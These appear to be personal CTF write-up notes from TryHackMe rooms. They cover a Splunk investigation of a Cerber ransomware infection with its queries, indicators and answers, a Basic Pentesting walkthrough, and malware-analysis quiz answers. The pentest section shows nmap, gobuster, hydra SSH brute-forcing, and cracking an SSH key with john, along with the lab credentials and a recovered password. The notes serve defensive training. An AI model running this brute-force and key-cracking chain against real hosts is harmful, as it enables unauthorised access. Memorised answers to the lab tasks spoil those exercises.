“Next” “KK0H=46” “enD sUb”) do @echo %~i)>“!GSI!” && start "" “!GSI!”	4490
Answer: 4490




#5 Bob Smith's workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IP address of the file server?
index=botsv1 host="we8105desk" sourcetype=WinRegistry fileshare
| head 1
# Time	Event
# 8/24/16 5:15:18.000 PM
# 08/24/2016 11:15:18.043
# … 2 lines omitted …
# process_image=“c:.exe”
# registry_type=“CreateKey”
# key_path=“HKU-1-5-21-67332772-3493699611-3403467266-11092#
# #192.168.250.20#fileshare”
# data_type=“REG_NONE”
Answer: 192.168.250.20



#6 What was the first suspicious domain visited by we8105desk on 24AUG2016?
# After removing all legitimate domains:
index=botsv1 src_ip="192.168.250.100" sourcetype=stream:dns record_type=A NOT (query{}="*microsoft.com" OR query{}="wpad" OR query{}="*.waynecorpinc.local" OR query{}="isatap" OR query{}="*bing.com" OR query{}="*windows.com" OR query{}="*msftncsi.com")
| table _time, query{}
| sort by _time
# Results:
# _time	query{}
# 2016-08-24 16:48:12.267	solidaritedeproximite.org
#                           solidaritedeproximite.org
# 2016-08-24 16:49:24.308	ipinfo.io
#                           ipinfo.io
# 2016-08-24 17:15:12.668	cerberhhyed5frqa.xmfir0.win
#                           cerberhhyed5frqa.xmfir0.win
Answer: solidaritedeproximite.org




#7 The malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file?
index=botsv1 src_ip="192.168.250.100" sourcetype=suricata http.hostname=solidaritedeproximite.org
|  table _time, http.http_method, http.hostname, http.url
# Results:
# _time	                    http.http_method	    http.hostname	            http.url
# 2016-08-24 16:48:13.492	GET	                    solidaritedeproximite.org	/mhtr.jpg
Answer: mhtr.jpg



#8 What is the parent process ID of 121214.tmp?
index=botsv1 121214.tmp sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" CommandLine=*
| table _time, CommandLine, ProcessId, ParentCommandLine, ParentProcessId
| reverse
# _time	                CommandLine	                                                ProcessId	ParentCommandLine	ParentProcessId
# 2016-08-24 16:48:21	“C:32.exe” /C START "" “C:.smith.WAYNECORPINC\121214.tmp”	1476	“C:32.exe” “C:.smith.WAYNECORPINC\20429.vbs”	3968
# 2016-08-24 16:48:21	“C:.smith.WAYNECORPINC\121214.tmp”	2948	“C:32.exe” /C START "" “C:.smith.WAYNECORPINC\121214.tmp”	1476
# 2016-08-24 16:48:29	“C:.smith.WAYNECORPINC\121214.tmp”	3828	“C:.smith.WAYNECORPINC\121214.tmp”	2948
# 2016-08-24 16:48:41	“C:.smith.WAYNECORPINC{35ACA89F-933F-6A5D-2776-A3589FB99832}.exe”	3836	“C:.smith.WAYNECORPINC\121214.tmp”	3828
# 2016-08-24 16:48:41	/d /c taskkill /t /f /im “121214.tmp” > NUL & ping -n 1 127.0.0.1 > NUL & del “C:.smith.WAYNECORPINC\121214.tmp” > NUL	1280	“C:.smith.WAYNECORPINC\121214.tmp”	3828
# 2016-08-24 16:48:41	taskkill /t /f /im “121214.tmp”	1684	/d /c taskkill /t /f /im “121214.tmp” > NUL & ping -n 1 127.0.0.1 > NUL & del “C:.smith.WAYNECORPINC\121214.tmp” > NUL	1280
# 2016-08-24 16:48:42	ping -n 1 127.0.0.1	556	/d /c taskkill /t /f /im “121214.tmp” > NUL & ping -n 1 127.0.0.1 > NUL & del “C:.smith.WAYNECORPINC\121214.tmp” > NUL	1280
Answer: 3968



#9 Amongst the Suricata signatures that detected the Cerber malware, which signature ID alerted the fewest number of times?
index=botsv1 cerber sourcetype=suricata
| stats count by alert.signature, alert.signature_id
| sort -count
# alert.signature	                                            alert.signature_id	count
# ETPRO TROJAN Ransomware/Cerber Checkin Error ICMP Response	2816764	            2
# ETPRO TROJAN Ransomware/Cerber Onion Domain Lookup	        2820156	            2
# ETPRO TROJAN Ransomware/Cerber Checkin 2	                    2816763	            1
Answer: 2816763



#10 The Cerber ransomware encrypts files located in Bob Smith's Windows profile. How many .txt files does it encrypt?
# First run the following request:
index=botsv1 host=we8105desk sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" *.txt
| stats count by TargetFilename
# We see that the ransomware crypts files in several locations.
# To focus on Bob Smith’s Windows profile, filter *.txt files in Bob Smith’s home folder:
index=botsv1 host=we8105desk sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" TargetFilename="C:\\Users\\bob.smith.WAYNECORPINC\\*.txt"
| stats dc(TargetFilename)
Answer: 406



#11 How many distinct PDFs did the ransomware encrypt on the remote file server?
# The majority of logs related to PDF is in the wineventlog sourcetype:
index=botsv1 *.pdf
| stats count by sourcetype
| sort -count
# Results:
# sourcetype	                                        count
# wineventlog	                                        527
# stream:smb	                                        283
# XmlWinEventLog:Microsoft-Windows-Sysmon/Operational	50
# WinRegistry	                                        3
# stream:http	                                        1

# There are 2 distinct destinations:
index=botsv1 *.pdf sourcetype=wineventlog
|  stats count by dest
|  sort -count
# dest	                        count
# we9041srv.waynecorpinc.local	526
# we8105desk.waynecorpinc.local	1

# The most probable one is the first name. target the source address:
index=botsv1 *.pdf sourcetype=wineventlog   dest="we9041srv.waynecorpinc.local"
|  stats count by Source_Address
|  sort -count
# Source_Address	count
# 192.168.250.100	525
# 192.168.2.50     	1

# The first IP was the one found in the beginning of our investigation for the remote file server.
# Now, we should be able to know how many PDF files have been encrypted on the remove file server:
index=botsv1 sourcetype=wineventlog dest="we9041srv.waynecorpinc.local" Source_Address="192.168.250.100" Relative_Target_Name="*.pdf"
| stats dc(Relative_Target_Name)
Answer: 257



#12 What fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?
# We already identified the domains at question #6:
index=botsv1 src_ip="192.168.250.100" sourcetype=stream:dns record_type=A NOT (query{}="*microsoft.com" OR query{}="wpad" OR query{}="*.waynecorpinc.local" OR query{}="isatap" OR query{}="*bing.com" OR query{}="*windows.com" OR query{}="*msftncsi.com")
| table _time, query{}
| sort by _time
# Results:
# _time	query{}
# 2016-08-24 16:48:12.267	solidaritedeproximite.org
#                           solidaritedeproximite.org
# 2016-08-24 16:49:24.308	ipinfo.io
#                           ipinfo.io
# 2016-08-24 17:15:12.668	cerberhhyed5frqa.xmfir0.win
#                           cerberhhyed5frqa.xmfir0.win
# At the end of the encryption process, the user is redirected to cerberhhyed5frqa.xmfir0.win.

```

Summary
* User (or someone) inserted an infected USB drive into Bob Smith’s workstation (not sure why!?!)
* Word document spawned a Suspicious Process which spawned additional processes
* File was downloaded after calls were made to a FQDN and IP address
* Encryption of files begin on both local disk and shares
* Redirection to an external site with notification of encryption occurred


![1000px-Ctf-tryhackme-BP-Splunk-RW-threatpic-all](https://i.imgur.com/ExTJF7w.png)

---

# THM - Basic Pentesting

Task 1  Web App Testing and Privilege Escalation

```bash

ping 10.10.100.180

nmap -sC -sV 0oN 10.10.100.180
# open port:
# 22
# 80
# 139
# 445


# What is the name of the hidden directory on the web server(enter name without /)?
browser > developer page
gobuster -w /usr/share/dirbuster/wordlists/wordlist.txt -u https://10.10.100.180/
show /development


# User brute-forcing to find the username & password
enum4linux -a 10.10.100.180
kay
jan


# What is the password?
hydra -l jan -P rockyou.txt ssh://10.10.100.180


# What service do you use to access the server(answer in abbreviation in all caps)?
SSH

# Enumerate the machine to find any vectors for privilege escalation
chmod +x linpeas.sh
linpeas.sh
got the ssh of kay
/opt/JohnTheRipper/run/ssh2john.py kay_id_rsa > sshpass.txt
/opt/JohnTheRipper/run/john sshpass.txt
/opt/JohnTheRipper/run/john sshpass.txt --wordlist=rockyou.txt
login to kay
cat pass.bak

heresareallystrongpasswordthatdollowsthepasswordpolicy$$
```

---


# THM - MAL: Malware Introductory

1. Delivery
2. Execution
3. Maintaining Persistence
4. Persistence
5. Propagation


```bash
# What is the famous example of a targeted attack-esque Malware that targeted Iran?
Stuxnet

# What is the name of the Ransomware that used the Eternalblue exploit in a "Mass Campaign" attack?
WannaCry
```


Static Analysis Tools:
- Dependency Walker (depends)
- PeID
- PE Explorer
- PEview
- ResourceHacker
- IDA Freeware
- WinDbg
- ResourceHacker


**Connecting to the Windows Analysis Environment (Deploy)**

MACHINE_IP
- Domain: ANALYSIS-PC
- Username: Analysis
- Password: tryhackme


```bash
# The MD5 Checksum of aws.exe
D2778164EF643BA8F44CC202EC7EF157

# The MD5 Checksum of Netlogo.exe
59CB421172A89E1E16C11A428326952Cc

# The MD5 Checksum of vlc.exe
5416BE1B8B04B1681CB39CF0E2CAAD9F

# What does PeID propose 1DE9176AD682FF.dll being packed with?
Microsoft Visual C++ 6.0 DLL

# What does PeID propose AD29AA1B.bin being packed with?
Microsoft Visual C++ 6.0

# What packer does PeID report file "6F431F46547DB2628" to be packed with?
FSG 1.0 -> dulek/xt


# strings "C:\Users\Analysis\Desktop\Tasks\Task 12\filename"
# What is the URL that is outputted after using "strings"
practicalmalwareanalysis.com
# How many unique "Imports" are there?
5

# What is the MD5 Checksum of the file?
F5BD8E6DC6782ED4DFA62B8215BDC429
# Does Virustotal report this file as malicious? (Yay/Nay)
Yay
# Output the strings using Sysinternals "strings" tool.
# What is the last string outputted?
d:h:
# What is the output of PeID when trying to detect what packer is used by thefile?
Nothing found
```












---














.
